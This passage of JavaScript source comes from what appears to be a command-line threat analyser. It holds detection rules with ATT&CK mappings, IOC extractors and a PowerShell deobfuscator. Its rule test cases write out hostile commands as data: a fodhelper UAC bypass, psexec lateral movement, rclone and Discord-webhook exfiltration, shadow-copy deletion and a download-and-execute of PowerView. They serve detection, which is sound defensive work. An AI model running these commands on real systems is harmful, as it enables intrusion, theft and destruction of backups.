 {id:"PRIV-UACBYPASS",name:"UAC bypass (registry hijack)",cat:"privilege-escalation",sev:"high",mitre:["T1548.002"],
  pat:[/ms-settings\\shell\\open\\command/i,/mscfile\\shell\\open\\command/i,/\b(fodhelper|computerdefaults|sdclt|eventvwr|wsreset)(\.exe)?\b[^\n]{0,200}(shell\\open|delegateexecute)/i,/(shell\\open|delegateexecute)[^\n]{0,200}\b(fodhelper|computerdefaults|sdclt|eventvwr|wsreset)(\.exe)?\b/i],
  desc:"Hijacks a registry handler used by an auto-elevating Windows binary (fodhelper, computerdefaults, eventvwr) to run code elevated without a UAC prompt.",
  t:{tp:["New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force; Start-Process fodhelper.exe"],fp:["Start-Process ms-settings:"]}},

 // ── Lateral movement ──────────────────────────────────────────────────────
 {id:"LAT-WINRM",name:"Remote execution (WinRM / PowerShell remoting)",cat:"lateral-movement",sev:"medium",mitre:["T1021.006"],
  pat:[/invoke-command\b[^\n;|]{0,200}-(computername|cn|session)\b/i,/enter-pssession/i,/new-pssession/i,/\bwinrs(\.exe)?\s+-r(emote)?:/i],
  desc:"Executes against a remote host over WinRM. Benign for admins; correlate with the source account.",
  t:{tp:["Invoke-Command -ScriptBlock { whoami } -ComputerName SRV01","Enter-PSSession -ComputerName dc01","winrs -r:srv01 cmd"],fp:["Invoke-Command -ScriptBlock { Get-Date }"]}},
 {id:"LAT-ADMINSHARE",name:"Admin-share access",cat:"lateral-movement",sev:"medium",mitre:["T1021.002"],
  pat:[/\\\\[^\\\s]+\\(admin\$|c\$|ipc\$|[d-z]\$)/i],
  desc:"Access to ADMIN$/C$ shares, a common lateral-movement / tool-staging vector.",
  t:{tp:["copy x.exe \\\\srv01\\C$\\Windows\\Temp\\","dir \\\\10.0.0.5\\ADMIN$"],fp:["dir \\\\fileserver\\finance"]}},
 {id:"LAT-PSEXEC",name:"PsExec-style remote execution",cat:"lateral-movement",sev:"high",mitre:["T1569.002","T1021.002"],
  pat:[/\b(psexec(64)?|paexec|csexec|remcom)(\.exe)?\s+[^\n]{0,60}\\\\/i,/\binvoke-(smbexec|wmiexec|psexec|thehash)\b/i,/\b(wmiexec|smbexec|atexec|dcomexec)\.py\b/i],
  desc:"Runs commands on another host through a remotely installed service (PsExec and clones, Impacket).",
  t:{tp:["psexec.exe \\\\srv01 -s cmd.exe","Invoke-SMBExec -Target 10.0.0.5 -Hash x"],fp:["Get-Process psexesvc"]}},

 // ── Discovery ─────────────────────────────────────────────────────────────
 {id:"DISC-AD",name:"Domain discovery",cat:"discovery",sev:"low",mitre:["T1087.002","T1482"],
  pat:[/get-ad(user|computer|group|groupmember|object)\b[^\n;|]{0,120}(-filter\s+["'{(]?\s*\*|-ldapfilter|-searchbase)/i,/get-ad(domain|trust|domaincontroller|forest)\b/i,/get-domain(user|computer|group|trust|controller)\b/i,/nltest(\.exe)?\s+\/(domain_trusts|dclist|dsgetdc)/i,/activedirectory\.domain\]::getcurrentdomain/i,/\bnet1?(\.exe)?\s+(user|group)\s+[^\n]{0,40}\/do(main)?\b/i,/\b(adfind|dsquery)(\.exe)?\b/i],
  desc:"Enumerates Active Directory users, computers, groups or trusts. Normal for admins; an early step in hands-on-keyboard intrusions.",
  t:{tp:["Get-ADComputer -Filter *","nltest /domain_trusts","net group \"domain admins\" /domain","adfind.exe -f objectcategory=computer"],fp:["Get-ADUser -Identity me"]}},
 {id:"DISC-LOCAL",name:"Local system reconnaissance",cat:"discovery",sev:"low",mitre:["T1033","T1082","T1016","T1049"],
  pat:[/\bwhoami(\.exe)?\s+\/(all|priv|groups)\b/i,/\bsysteminfo(\.exe)?\b/i,/\bipconfig(\.exe)?\s+\/all\b/i,/\bnet1?(\.exe)?\s+view\b/i,/\barp(\.exe)?\s+-a\b/i,/\bnetstat(\.exe)?\s+-\w*n/i,/\bquser\b|\bquery\s+user\b/i],
  desc:"Gathers user, host and network details. A run of these in one session is typical of the first minutes of hands-on-keyboard activity.",
  t:{tp:["whoami /all; systeminfo; ipconfig /all","net view /all"],fp:["Get-Date"]}},

 // ── Collection / exfiltration ─────────────────────────────────────────────
 {id:"COLL-CLIPBOARD",name:"Clipboard access",cat:"collection",sev:"low",mitre:["T1115"],
  pat:[/get-clipboard/i,/\[system\.windows\.forms\.clipboard\]::gettext/i],
  desc:"Reads the clipboard, used by stealers and crypto-address swappers.",
  t:{tp:["Get-Clipboard"],fp:["Set-Clipboard x"]}},
 {id:"COLL-ARCHIVE",name:"Data archived for transfer",cat:"collection",sev:"medium",mitre:["T1560.001"],
  pat:[/\b(7z|7za|7zr)(\.exe)?\s+a\b[^\n]{0,120}(-p\S*|-mhe)/i,/\b(rar|winrar)(\.exe)?\s+a\b[^\n]{0,120}-hp/i,/compress-archive\b[^\n;|]{0,120}(\\users\\|\\shares?\\|\$env:userprofile|documents)/i],
  desc:"Packs files into (often password-protected) archives - a common staging step before exfiltration.",
  t:{tp:["7z.exe a -pInfected1 -mhe=on C:\\ProgramData\\d.7z \\\\fs01\\finance","rar a -hpSecret d.rar C:\\Users\\x\\Documents"],fp:["7z x archive.7z","Compress-Archive -Path .\\build -DestinationPath out.zip"]}},
 {id:"EXFIL-UPLOAD",name:"Data upload / possible exfiltration",cat:"exfiltration",sev:"medium",mitre:["T1041","T1567"],
  pat:[/\.upload(string|file|data)\s*\(/i,/invoke-(restmethod|webrequest)[^\n|;]{0,160}-method\s+["']?post[^\n|;]{0,160}-(infile|body)/i,/discord(app)?\.com\/api\/webhooks/i,/api\.telegram\.org\/bot/i],
  desc:"Sends data to a remote endpoint. Discord and Telegram webhooks are common exfiltration channels for stealers.",
  t:{tp:["(New-Object Net.WebClient).UploadFile('http://x/u','C:\\d.zip')","Invoke-RestMethod -Uri https://discord.com/api/webhooks/1/x -Method Post -Body $b"],fp:["Invoke-RestMethod https://api.example/status"]}},
 {id:"EXFIL-CLOUD",name:"Exfiltration tool / cloud storage",cat:"exfiltration",sev:"high",mitre:["T1567.002"],
  pat:[/\brclone(\.exe)?\s+(copy|sync|move)\b/i,/\brclone(\.exe)?\b[^\n]{0,80}\b(mega|ftp|sftp|s3|pcloud|dropbox|gdrive|onedrive)\b:/i,/\b(megacmd|mega-put|megatools)\b/i,/\bwinscp(\.com|\.exe)?\b[^\n]{0,80}\b(put|synchronize\s+remote)\b/i,/\brestic(\.exe)?\s+(backup|-r)\b/i],
  desc:"Uses rclone, MEGA, WinSCP or restic to copy data to cloud or attacker-controlled storage - the most common ransomware exfiltration toolset.",
  t:{tp:["rclone.exe copy \\\\fs01\\finance mega:backup -q","winscp.com /command \"open sftp://x\" \"put C:\\d.7z\""],fp:["rclone version"]}},

 // ── Impact ────────────────────────────────────────────────────────────────
 {id:"IMP-RECOVERY",name:"Backups and shadow copies deleted",cat:"impact",sev:"critical",mitre:["T1490"],
  pat:[/vssadmin(\.exe)?\s+(delete|resize)\s+shadow/i,/win32_shadowcopy[^\n]{0,80}(delete|remove)/i,/\bwmic(\.exe)?\s+shadowcopy\s+delete/i,/wbadmin(\.exe)?\s+delete\s+(catalog|systemstatebackup|backup)/i,/bcdedit[^\n]{0,40}(recoveryenabled\s+no|bootstatuspolicy\s+ignoreallfailures)/i,/remove-wbbackupset|remove-wbsummary/i],
  desc:"Deletes Volume Shadow Copies or backups, or disables recovery. A strong ransomware precursor.",
  t:{tp:["vssadmin delete shadows /all /quiet","Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_.Delete() }","wmic shadowcopy delete","bcdedit /set {default} recoveryenabled No"],fp:["vssadmin list shadows"]}},

 // ── Tooling ───────────────────────────────────────────────────────────────
 {id:"TOOL-POSTEX",name:"Known post-exploitation tooling",cat:"tooling",sev:"high",mitre:["T1059.001"],
  pat:[/invoke-shellcode/i,/invoke-dllinjection/i,/invoke-reflectivepeinjection/i,/powersploit/i,
       /invoke-empire/i,/\bpowerview(\.ps1)?\b/i,/invoke-bloodhound/i,/\bsharphound\b/i,/\bnishang\b/i,/invoke-obfuscation/i,
       /\bcobalt\s?strike\b/i,/\binvoke-(inveigh|tokenmanipulation|portscan|userhunter|sessiongopher|phant0m)\b/i,
       /\b(rubeus|seatbelt|sharpup|sharpdpapi|certify|lazagne)(\.exe)?\b/i,/get-gpppassword/i,/\bpowerup(\.ps1)?\b|invoke-allchecks/i],
  desc:"Function/tool names from PowerSploit, Empire, Nishang, Cobalt Strike, BloodHound, GhostPack and similar frameworks.",
  t:{tp:["IEX (iwr http://x/PowerView.ps1); Get-DomainUser","Invoke-BloodHound -CollectionMethod All","SharpHound.exe -c All"],fp:["navigator.sendBeacon('/log')"]}},
];

/* ---- IOC patterns ----------------------------------------------------- */
const IOC = {
  url:      /https?:\/\/[^\s'"\)\}<>|`]+/ig,
  ipv4:     /\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)\b/g,
  ip_port:  /\b(?:\d{1,3}\.){3}\d{1,3}:\d{1,5}\b/g,
  domain:   /\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24}\b/ig,
  unc_path: /\\\\[^\\\s'"|`]+\\[^\s'"|`]+/g,
  win_path: /[a-z]:\\[^\s'"|`<>]+/ig,
  reg_key:  /HK(?:LM|CU|CR|U|CC)\\[^\s'"|`]+/ig,
};
const DOMAIN_STOP = /\.(exe|dll|ps1|psm1|ps1xml|bat|cmd|txt|log|dat|tmp|sys|ini|xml|json|cs|vbs|msi|msu|zip|7z|rar|gz|scr|hta|jar|lnk)$|^(system|net|io|text|reflection|management|automation|runtime|interopservices|convert|math|console|environment)\./i;

/* ---- ATT&CK reference ------------------------------------------------- */

/* ---- MITRE ATT&CK names / tactics for the techniques used here (from MITRE's
   Enterprise STIX data, 2026-07-31; same source as fx's own ATT&CK map). ---- */
const ATTACK_DATE="2026-07-31";
const ATTACK={
 "T1003.001":["OS Credential Dumping: LSASS Memory","Credential Access"],
 "T1003.002":["OS Credential Dumping: Security Account Manager","Credential Access"],
 "T1003.003":["OS Credential Dumping: NTDS","Credential Access"],
 "T1016":["System Network Configuration Discovery","Discovery"],
 "T1021.002":["Remote Services: SMB/Windows Admin Shares","Lateral Movement"],
 "T1021.006":["Remote Services: Windows Remote Management","Lateral Movement"],
 "T1027.010":["Obfuscated Files or Information: Command Obfuscation","Stealth"],
 "T1033":["System Owner/User Discovery","Discovery"],
 "T1041":["Exfiltration Over C2 Channel","Exfiltration"],
 "T1047":["Windows Management Instrumentation","Execution"],
 "T1049":["System Network Connections Discovery","Discovery"],
 "T1053.005":["Scheduled Task/Job: Scheduled Task","Execution / Persistence / Privilege Escalation"],
 "T1055":["Process Injection","Privilege Escalation / Stealth"],
 "T1056.002":["Input Capture: GUI Input Capture","Credential Access / Collection"],
 "T1059.001":["Command and Scripting Interpreter: PowerShell","Execution"],
 "T1070.003":["Indicator Removal: Clear Command History","Stealth"],
 "T1070.006":["Indicator Removal: Timestomp","Stealth"],
 "T1071.004":["Application Layer Protocol: DNS","Command and Control"],
 "T1082":["System Information Discovery","Discovery"],
 "T1087.002":["Account Discovery: Domain Account","Discovery"],
 "T1095":["Non-Application Layer Protocol","Command and Control"],
 "T1098":["Account Manipulation","Persistence / Privilege Escalation"],
 "T1105":["Ingress Tool Transfer","Command and Control"],
 "T1115":["Clipboard Data","Collection"],
 "T1136.001":["Create Account: Local Account","Persistence"],
 "T1140":["Deobfuscate/Decode Files or Information","Stealth"],
 "T1197":["BITS Jobs","Execution / Persistence / Stealth"],
 "T1204.004":["User Execution: Malicious Copy and Paste","Execution"],
 "T1218.005":["System Binary Proxy Execution: Mshta","Stealth"],
 "T1218.010":["System Binary Proxy Execution: Regsvr32","Stealth"],
 "T1218.011":["System Binary Proxy Execution: Rundll32","Stealth"],
 "T1219.002":["Remote Access Tools: Remote Desktop Software","Command and Control"],
 "T1482":["Domain Trust Discovery","Discovery"],
 "T1490":["Inhibit System Recovery","Impact"],
 "T1543.003":["Create or Modify System Process: Windows Service","Persistence / Privilege Escalation"],
 "T1546.003":["Event Triggered Execution: Windows Management Instrumentation Event Subscription","Persistence / Privilege Escalation"],
 "T1547.001":["Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder","Persistence / Privilege Escalation"],
 "T1548.002":["Abuse Elevation Control Mechanism: Bypass User Account Control","Privilege Escalation"],
 "T1552.001":["Unsecured Credentials: Credentials In Files","Credential Access"],
 "T1555.003":["Credentials from Password Stores: Credentials from Web Browsers","Credential Access"],
 "T1558.003":["Steal or Forge Kerberos Tickets: Kerberoasting","Credential Access"],
 "T1560.001":["Archive Collected Data: Archive via Utility","Collection"],
 "T1564.001":["Hide Artifacts: Hidden Files and Directories","Stealth"],
 "T1564.003":["Hide Artifacts: Hidden Window","Stealth"],
 "T1564.012":["Hide Artifacts: File/Path Exclusions","Stealth"],
 "T1567":["Exfiltration Over Web Service","Exfiltration"],
 "T1567.002":["Exfiltration Over Web Service: Exfiltration to Cloud Storage","Exfiltration"],
 "T1569.002":["System Services: Service Execution","Execution"],
 "T1620":["Reflective Code Loading","Stealth"],
 "T1685":["Disable or Modify Tools","Defense Impairment"],
 "T1685.001":["Disable or Modify Tools: Disable or Modify Windows Event Log","Defense Impairment"],
 "T1685.005":["Disable or Modify Tools: Clear Windows Event Logs","Defense Impairment"],
 "T1686.003":["Disable or Modify System Firewall: Windows Host Firewall","Defense Impairment"],
 "T1689":["Downgrade Attack","Defense Impairment"],
 "T1690":["Prevent Command History Logging","Defense Impairment"]
};


/* ---- deobfuscation (records an ordered step per transform) ------------ */
function excerpt(s,n){ n=n||90; s=String(s).replace(/[\r\n]+/g," "); return s.length<=n?s:s.slice(0,n)+" ..."; }
function mkstep(ctx,layer,tech,mitre,detail,before,after){
  ctx.n++; ctx.steps.push({n:ctx.n,layer,tech,mitre,detail,before,after});
}
function asciiRatio(t){
  if(!t) return 0; let g=0;
  for(const c of t){ const o=c.charCodeAt(0); if((o>=32&&o<=126)||o===9||o===10||o===13) g++; }
  return g/t.length;
}
const DECODE_EVIDENCE=["http","://","iex","invoke","new-object","downloadstring","frombase64",
  ".ps1","system.","reflection","-join","[char]","scriptblock","powershell","webclient","$(",
  "::","start-","set-item","gzip","deflate","-enc","bypass"];
function looksLikeScript(t){
  // Score a candidate DECODING: must be mostly printable ASCII AND carry a script/URL token.
  // Rejects plaintext (e.g. a domain label grabbed as base64 and mangled into CJK).
  if(!t) return 0;
  if(asciiRatio(t)<0.85) return 0;
  const s=t.trim();
  if(s.length>=24 && /^[A-Za-z0-9+/=\s]+$/.test(s)) return 0.5;  // nested base64, worth peeling
  const low=t.toLowerCase();
  let hits=0; for(const k of DECODE_EVIDENCE){ let i=0; while((i=low.indexOf(k,i))!==-1){hits++;i+=k.length;} }
  if(hits===0) return 0;
  return Math.min(1, 0.4 + hits/6);
}
function b64ToBytes(b64){
  const clean=b64.replace(/[^A-Za-z0-9+/]/g,"");
  const padded=clean+"=".repeat((4-clean.length%4)%4);
  const bin=atob(padded);
  const out=new Uint8Array(bin.length);
  for(let i=0;i<bin.length;i++) out[i]=bin.charCodeAt(i);
  return out;
}
async function inflate(bytes,fmt){
  const ds=new DecompressionStream(fmt);
  const stream=new Blob([bytes]).stream().pipeThrough(ds);
  const buf=await new Response(stream).arrayBuffer();
  return new Uint8Array(buf);
}
async function tryB64(blob){
  let bytes; try{ bytes=b64ToBytes(blob); }catch(e){ return []; }
  if(!bytes.length) return [];
  const out=[];
  try{ out.push({tag:"UTF-16LE",tech:"Base64 decode (UTF-16LE)",text:new TextDecoder("utf-16le").decode(bytes)}); }catch(e){}
  try{ out.push({tag:"UTF-8",tech:"Base64 decode (UTF-8)",text:new TextDecoder("utf-8",{fatal:false}).decode(bytes)}); }catch(e){}
  if(bytes[0]===0x1f && bytes[1]===0x8b){
    try{ out.push({tag:"gzip",tech:"Gzip decompression",text:new TextDecoder().decode(await inflate(bytes,"gzip"))}); }catch(e){}
  }
  try{ out.push({tag:"deflate",tech:"Deflate decompression",text:new TextDecoder().decode(await inflate(bytes,"deflate-raw"))}); }catch(e){}
  return out;
}
function pBacktick(text,layer,ctx){
  const clusters=text.match(/\w(?:`\w)+/g);
  const nw=text.replace(/(\w)`(?=\w)/g,"$1");
  if(nw!==text){
    const s=clusters?clusters[0]:"`";
    const removed=(text.split("`").length-1)-(nw.split("`").length-1);
    mkstep(ctx,layer,"Backtick token-splitting","T1027.010",
      "removed "+removed+" identifier backtick(s)",
      excerpt(s), excerpt(s.replace(/(\w)`(?=\w)/g,"$1")));
  }
  return nw;
}
function pReverse(text,layer,ctx){
  const re=/(['"])((?:(?!\1).){2,})\1\s*\[\s*-1\s*\.\.\s*-?\d+\s*\]\s*-join\s*(['"])\3/g;
  return text.replace(re,(full,q,lit)=>{
    const r=lit.split("").reverse().join("");
    mkstep(ctx,layer,"String reversal","T1027.010","reversed a literal",excerpt(full),excerpt("'"+r+"'"));
    return "'"+r+"'";
  });
}
function pFormat(text,layer,ctx){
  const re=/(['"])((?:\{\d+\}|(?!\1).)*)\1\s*-f\s*((?:\s*(['"])(?:(?!\4).)*\4\s*,?)+)/g;
  return text.replace(re,(full,q,fmt,argstr)=>{
    const args=[...argstr.matchAll(/(['"])((?:(?!\1).)*)\1/g)].map(a=>a[2]);
    let ok=true;
    const r=fmt.replace(/\{(\d+)\}/g,(g,n)=>{ if(args[+n]===undefined){ok=false;return g;} return args[+n]; });
    if(!ok) return full;
    mkstep(ctx,layer,"Format-operator (-f) reconstruction","T1027.010",
      "reordered string fragments",excerpt(full),excerpt("'"+r+"'"));
    return "'"+r+"'";
  });
}
function pCharJoin(text,layer,ctx){
  text=text.replace(/\(([\d\s,]+)\)\s*-join\s*(['"])\2/g,(full,nums)=>{
    const cps=nums.match(/\d+/g); if(!cps) return full;
    const s=cps.map(n=>String.fromCharCode(+n)).join("");
    mkstep(ctx,layer,"Char-code array reconstruction","T1027.010",cps.length+" code points",excerpt(full),excerpt("'"+s+"'"));
    return "'"+s+"'";
  });
  text=text.replace(/(?:\[char\]\s*\d+\s*\+?\s*){2,}/ig,(full)=>{
    const cps=full.match(/\d+/g); if(!cps) return full;
    const s=cps.map(n=>String.fromCharCode(+n)).join("");
    mkstep(ctx,layer,"[char] sequence reconstruction","T1027.010","concatenated [char] casts",excerpt(full),excerpt(s));
    return s;
  });
  return text;
}
async function pBase64(text,layer,ctx){
  const re=new RegExp("[A-Za-z0-9+/]{"+MIN_B64+",}={0,2}","g");
  let result=text;
  for(const m of text.matchAll(re)){
    const blob=m[0];
    const pre=text.slice(Math.max(0,m.index-28),m.index).toLowerCase();
    // argument to an encoded-command switch / FromBase64String / ::Create => base64 by contract
    const trusted=/-e[a-z]*\s*$/.test(pre)||pre.includes("frombase64string")||pre.includes("::create");
    const cands=await tryB64(blob);
    let best=null,bestKey=[-1,-1];
    for(const c of cands){
      const ev=looksLikeScript(c.text), ar=asciiRatio(c.text);
      const ok = ev>=0.4 || (trusted && ar>=0.90);
      if(ok && (ev>bestKey[0] || (ev===bestKey[0] && ar>bestKey[1]))){ best=c; bestKey=[ev,ar]; }
    }
    if(best){
      mkstep(ctx,layer,best.tech,"T1027.010",
        blob.length+" chars \u2192 "+best.text.length+" chars",excerpt(blob,50),excerpt(best.text));
      result=result.split(blob).join(`\n/*[decoded:${best.tag}]*/\n${best.text}\n`);
    }
  }
  return result;
}
async function deobfuscate(cmd){
  const ctx={n:0,steps:[]}; let cur=cmd;
  for(let layer=1;layer<=MAX_DEPTH;layer++){
    let nx=cur;
    nx=pBacktick(nx,layer,ctx); nx=pReverse(nx,layer,ctx); nx=pFormat(nx,layer,ctx);
    nx=pCharJoin(nx,layer,ctx); nx=await pBase64(nx,layer,ctx);
    if(nx===cur) break;
    cur=nx;
  }
  const layers=ctx.steps.reduce((m,s)=>Math.max(m,s.layer),0);
  return {final:cur, steps:ctx.steps, layers};
}

/* ---- detection / iocs / scoring -------------------------------------- */
function matchRules(hay){
  const found=[];
  for(const r of RULES){
    const hits=[];
    for(const p of r.pat){
      const g=new RegExp(p.source, p.flags.includes("g")?p.flags:p.flags+"g");
      let m; while((m=g.exec(hay))!==null){ const f=m[0].trim().slice(0,120);
        if(f&&!hits.includes(f)) hits.push(f); if(g.lastIndex===m.index) g.lastIndex++; }
    }
    if(hits.length) found.push({...r, matched:hits.slice(0,5)});
  }
  return found;
}
function extractIOCs(text){
  const out={};
  for(const [name,re] of Object.entries(IOC)){
    const set=new Set(); let m; re.lastIndex=0;
    while((m=re.exec(text))!==null){ set.add(m[0]); if(re.lastIndex===m.index) re.lastIndex++; }
    let vals=[...set];
    if(name==="domain") vals=vals.filter(v=>!DOMAIN_STOP.test(v));
    if(vals.length) out[name]=vals.sort();
  }
  return out;
}
function verdict(s){
  if(s>=15) return ["MALICIOUS (high confidence)","critical"];
  if(s>=8)  return ["SUSPICIOUS (likely malicious / operator activity)","high"];
  if(s>=3)  return ["SUSPICIOUS (review in context)","medium"];
  if(s>0)   return ["LOW / benign-leaning (review)","low"];
  return ["BENIGN (no known-bad indicators)","ok"];
}
async function sha256hex(str){
  if(!(globalThis.crypto && crypto.subtle)) return "";   // non-secure context: skip the hash, keep the analysis
  const buf=await crypto.subtle.digest("SHA-256", new TextEncoder().encode(str));
  return [...new Uint8Array(buf)].map(b=>b.toString(16).padStart(2,"0")).join("");
}
const EX_VERBS={"get": "retrieves", "set": "modifies", "new": "creates", "remove": "deletes", "add": "adds to", "start": "launches", "stop": "stops", "restart": "restarts", "invoke": "executes", "out": "sends output to", "import": "loads", "export": "writes out", "convertto": "converts to", "convertfrom": "converts from", "register": "registers (often persistence)", "unregister": "removes", "enable": "enables", "disable": "disables", "clear": "clears", "copy": "copies", "move": "moves", "rename": "renames", "test": "checks", "select": "selects", "where": "filters", "sort": "sorts", "measure": "measures", "group": "groups", "format": "formats", "write": "writes", "read": "reads", "update": "updates", "install": "installs", "uninstall": "uninstalls", "save": "saves", "receive": "receives", "send": "sends", "connect": "connects", "disconnect": "disconnects", "enter": "enters (remoting/session)", "exit": "exits", "find": "finds", "search": "searches", "wait": "waits", "resolve": "resolves", "expand": "expands", "compress": "compresses", "protect": "encrypts", "unprotect": "decrypts", "suspend": "suspends", "resume": "resumes", "mount": "mounts", "split": "splits", "join": "joins", "push": "pushes", "pop": "pops"};
const EX_CMDLETS={"iex": ["executes a string as PowerShell code (dynamic execution)", "suspicious"], "invoke-expression": ["executes a string as PowerShell code (dynamic execution)", "suspicious"], "irm": ["Invoke-RestMethod: fetches remote content over HTTP(S)", "notable"], "invoke-restmethod": ["fetches remote content over HTTP(S)", "notable"], "iwr": ["Invoke-WebRequest: fetches remote content over HTTP(S)", "notable"], "invoke-webrequest": ["fetches remote content over HTTP(S)", "notable"], "wget": ["alias for Invoke-WebRequest: fetches remote content", "notable"], "curl": ["alias for Invoke-WebRequest: fetches remote content", "notable"], "new-object": ["instantiates a .NET or COM object", "notable"], "add-type": ["compiles/loads .NET code at runtime", "suspicious"], "new-module": ["creates a dynamic in-memory module (can run a scriptblock without IEX)", "suspicious"], "invoke-command": ["runs a scriptblock, possibly on a remote host (WinRM)", "notable"], "icm": ["Invoke-Command: runs a scriptblock, possibly remote (WinRM)", "notable"], "enter-pssession": ["opens an interactive remote session (WinRM)", "notable"], "new-pssession": ["creates a remote session (WinRM)", "notable"], "start-process": ["launches a new process", "notable"], "saps": ["Start-Process: launches a new process", "notable"], "start-bitstransfer": ["downloads a file via BITS", "notable"], "import-module": ["loads a PowerShell module", "info"], "set-mppreference": ["changes Microsoft Defender settings (often disabling protection)", "suspicious"], "add-mppreference": ["adds a Defender setting (often an exclusion path)", "suspicious"], "set-executionpolicy": ["changes the script execution policy", "notable"], "register-scheduledtask": ["creates a scheduled task (persistence)", "suspicious"], "new-scheduledtask": ["defines a scheduled task (persistence)", "suspicious"], "schtasks": ["creates/edits a scheduled task (persistence)", "suspicious"], "new-itemproperty": ["writes a registry value (Run-key => persistence)", "notable"], "set-itemproperty": ["writes a registry/item value (Run-key => persistence)", "notable"], "new-item": ["creates a file/registry item", "info"], "set-wmiinstance": ["creates a WMI instance (event-subscription persistence)", "suspicious"], "register-wmievent": ["registers a WMI event (persistence)", "suspicious"], "register-cimindicationevent": ["registers a CIM/WMI event (persistence)", "suspicious"], "new-service": ["creates a Windows service (persistence)", "suspicious"], "get-credential": ["prompts for credentials", "notable"], "invoke-mimikatz": ["runs Mimikatz (credential dumping)", "suspicious"], "convertto-securestring": ["builds a SecureString (watch for a hard-coded key)", "notable"], "convertfrom-securestring": ["serialises a SecureString", "notable"], "out-null": ["discards output (hides results)", "info"], "out-file": ["writes output to a file", "info"], "get-childitem": ["lists files/registry entries", "info"], "gci": ["Get-ChildItem: lists files/registry entries", "info"], "get-content": ["reads file content", "info"], "gc": ["Get-Content: reads file content", "info"], "where-object": ["filters objects", "info"], "foreach-object": ["iterates over objects", "info"], "stop-process": ["terminates a process", "notable"], "get-process": ["lists processes", "info"], "downloadstring": ["downloads URL content into memory as a string", "suspicious"]};
const EX_METHODS={"downloadstring": ["downloads URL content into memory as a string", "suspicious"], "downloadfile": ["downloads a URL to a file on disk", "suspicious"], "downloaddata": ["downloads URL content as raw bytes", "suspicious"], "openread": ["opens a readable remote stream", "notable"], "uploadstring": ["sends data to a remote URL (possible exfiltration)", "suspicious"], "uploadfile": ["uploads a file to a remote URL (possible exfiltration)", "suspicious"], "create": ["constructs an object from the input (e.g. a scriptblock from a string)", "notable"], "invoke": ["executes the target (scriptblock, method, or delegate)", "notable"], "invokereturnasis": ["executes the target and returns the result", "suspicious"], "frombase64string": ["decodes base64 text into bytes", "notable"], "tobase64string": ["encodes bytes as base64 text", "info"], "getstring": ["decodes bytes into text", "info"], "getbytes": ["encodes text into bytes", "info"], "load": ["loads a .NET assembly (in-memory / reflective load)", "suspicious"], "loadfile": ["loads a .NET assembly from a path", "suspicious"], "loadwithpartialname": ["loads a .NET assembly by name", "notable"], "gettype": ["reflection: resolves a type", "notable"], "getmethod": ["reflection: reaches a method (often non-public)", "suspicious"], "getfield": ["reflection: reaches a field (often non-public)", "suspicious"], "getproperty": ["reflection: reaches a property", "notable"], "setvalue": ["reflection: sets a field/property value", "suspicious"], "invokemember": ["reflection: invokes a member dynamically", "suspicious"], "getdelegatefortype": ["creates a callable delegate (native code execution)", "suspicious"], "getprocaddress": ["resolves a native function address (API hooking/shellcode)", "suspicious"], "virtualalloc": ["allocates memory, often executable (shellcode)", "suspicious"], "createthread": ["starts a thread, often on shellcode", "suspicious"], "readtoend": ["reads a stream to the end", "info"], "getnewclosure": ["captures a scriptblock as a closure (execution)", "suspicious"], "start": ["starts the object (process / transfer)", "notable"], "replace": ["replaces text (can rebuild obfuscated strings)", "notable"], "split": ["splits a string", "info"]};
const EX_TYPES={"convert": ["[Convert]: base64 / numeric conversions", "info"], "encoding": ["text <-> byte encoding", "info"], "webclient": ["HTTP client object (download cradle)", "suspicious"], "webrequest": ["HTTP request object", "notable"], "memorystream": ["in-memory byte buffer", "info"], "gzipstream": ["gzip (de)compression stream", "notable"], "deflatestream": ["deflate (de)compression stream", "notable"], "streamreader": ["reads a stream into text", "info"], "assembly": ["[Reflection.Assembly]: runtime assembly loading (fileless .NET)", "suspicious"], "scriptblock": ["PowerShell code as an object; ::Create builds one from a string", "suspicious"], "amsiutils": ["internal AMSI object (tamper target)", "suspicious"], "marshal": ["native interop: memory, pointers, function pointers (shellcode)", "suspicious"], "ref": ["[Ref]: used to reach internal fields (e.g. AMSI bypass)", "suspicious"], "char": ["character cast (often string obfuscation)", "notable"], "text": ["System.Text namespace (encoding)", "info"], "file": ["file read/write", "info"], "process": ["process control", "notable"], "runtime": ["runtime / interop services", "notable"], "bitconverter": ["byte <-> value conversions", "info"], "intptr": ["native pointer type", "notable"], "diagnostics": ["System.Diagnostics (process/eventlog control)", "notable"]};
const EX_PARAMS={"-encodedcommand": ["runs a base64/UTF-16LE-encoded script (hides the command line)", "suspicious"], "-enc": ["runs a base64/UTF-16LE-encoded script (hides the command line)", "suspicious"], "-e": ["(-EncodedCommand) runs a base64-encoded script", "suspicious"], "-ec": ["runs a base64-encoded script", "suspicious"], "-noprofile": ["skips the user profile (automation/stealth)", "notable"], "-nop": ["(-NoProfile) skips the user profile (automation/stealth)", "notable"], "-windowstyle": ["controls window visibility", "notable"], "-w": ["(-WindowStyle) controls window visibility ('hidden' => no window)", "notable"], "-executionpolicy": ["sets execution policy for this process", "notable"], "-ep": ["(-ExecutionPolicy) sets execution policy ('bypass' disables it)", "notable"], "-exec": ["(-ExecutionPolicy) sets execution policy ('bypass' disables it)", "notable"], "-noninteractive": ["suppresses interactive prompts (automation)", "notable"], "-noni": ["(-NonInteractive) suppresses prompts (automation)", "notable"], "-command": ["runs the following command text", "info"], "-c": ["(-Command) runs the following command text", "info"], "-file": ["runs the specified script file", "info"], "-nologo": ["hides the banner", "info"], "-sta": ["single-threaded apartment mode", "info"], "-hidden": ["value 'hidden' (no window)", "notable"], "-outfile": ["writes the response to a file", "info"], "-uri": ["target URL", "info"], "-usebasicparsing": ["avoids the IE engine when fetching (headless)", "info"]};
